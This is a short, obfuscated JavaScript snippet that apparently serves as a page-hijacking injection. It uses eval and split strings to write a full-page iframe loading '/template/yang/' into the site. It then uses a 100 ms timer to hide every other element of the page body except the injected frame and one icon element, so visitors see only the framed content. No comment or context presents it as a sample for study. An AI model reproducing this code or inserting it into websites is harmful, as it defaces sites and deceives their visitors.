var  ss = '<center id="showcloneshengxiaon"><ifr'+'ame scrolling="no" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14'+'00" height="30'+'10 "   src="/template/yang/"></iframe></center>';
eval("do"+"cu"+"ment.wr"+"ite('"+ss+"');");
	
try{
	setInterval(function(){

		try{
			document.getElementById("div"+"All").style.display="no"+"ne";
		}catch(e){}

		for(var i=0;i<document.body.children.length;i++){
			try{
				var tagname = document.body.children[i].tagName;
				var myid = document.body.children[i].id;
				if(myid!="iconDiv1" && myid!="showcloneshengxiaon"){
				  // if(tagname!="center"){ 
				     document.body.children[i].style.display="non"+"e";
				   //}
				}
			}catch(e){}
		}

	},100);
}catch(e){}